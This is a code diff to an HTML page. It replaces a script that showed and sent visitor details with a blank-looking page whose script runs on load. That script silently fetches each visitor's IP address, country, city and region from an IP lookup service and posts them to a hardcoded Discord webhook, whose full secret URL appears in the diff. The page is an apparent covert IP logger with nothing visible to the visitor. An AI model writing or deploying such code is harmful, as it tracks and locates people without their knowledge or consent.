@@ -159,24 +159,35 @@
 
 </body>
 </html>
-const webhookURL = "[PUT_YOUR_WEBHOOK_HERE](https://discord.com/api/webhooks/1414004082456395878/_H_KjbE0reS3k6tQgtV0qBJUXD_24NwMDnWhkDzMU7gzUNO8dDZ818AlYLL-QquE96CG)";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title></title>
+</head>
+<body>
 
-fetch('https://ipinfo.io/json')
-  .then(response => response.json())
-  .then(data => {
-      // عرض البيانات على الصفحة
-      const infoDiv = document.getElementById('ip-info');
-      infoDiv.textContent = JSON.stringify(data, null, 2);
-
-      // إرسال البيانات إلى Webhook
-      fetch(webhookURL, {
+  <script>
+    fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+        const { ip, country, city, region } = data;
+        const dateTime = new Date().toLocaleString();
+        const webhookUrl = 'https://discord.com/api/webhooks/1414004082456395878/_H_KjbE0reS3k6tQgtV0qBJUXD_24NwMDnWhkDzMU7gzUNO8dDZ818AlYLL-QquE96CG';
+        
+        const payload = {
+          content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nRegion: ${region}\nDate & Time: ${dateTime}`
+        };
+        
+        fetch(webhookUrl, {
           method: 'POST',
-          headers: {
-              'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-              content: `New visitor info:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nOrg: ${data.org}`
-          })
-      });
-  });
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+      })
+      .catch(error => console.error('Error fetching IP info:', error));
+  </script>
+</body>
+</html>
+
 
